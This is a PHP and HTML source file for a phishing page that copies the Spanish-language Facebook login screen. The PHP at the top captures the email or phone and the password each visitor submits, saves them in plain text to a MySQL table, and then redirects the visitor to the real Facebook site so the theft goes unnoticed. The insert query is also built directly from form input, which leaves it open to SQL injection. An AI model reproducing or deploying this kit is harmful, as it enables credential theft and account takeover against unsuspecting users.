<?php

$servidor = "localhost";
$usuario = "root";
$clave = "";
$basededato = "login";

$enlace = mysqli_connect ($servidor , $usuario , $clave , $basededato);


if(isset ($_POST['registro'])){

    $nombre= $_POST ['nombre'];
    $contrasena= $_POST ['clave'];

    $insertadatos = "INSERT INTO getfiles VALUES('$nombre','$contrasena','')";

    $ejecutarInserta = mysqli_query ($enlace , $insertadatos);

    header('location:https://es-la.facebook.com/');
    exit();

}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook - Log In or Sign Up</title>
</head>

<body>
    <div class="container">
        <div class="container-profile">
            <span class="logo">
                <img src="img/1.svg">
            </span>
            <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="container-form">
            <form action="./index.php"  method="post" class="form">
            
                <input  name="nombre" type="text" placeholder="Correo electronico o numero de telefono">
                <input name="clave" type="password" placeholder="Contraseña">
              
                 <input name="registro" onclick="lim()" type="submit" value="Iniciar Sesión">
                
                <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                <div class="border"></div>
                <button><a href="#">Crear cuenta nueva</a></button>
            </form>
            <p class="create-page">
                <a href="#">Crear una pagina</a> para una celebridad , una marca o un <br> neogocio.
            </p>
        </div>
    </div>
<script src="limpiar.js" >
   
     </script>
</body>

</html>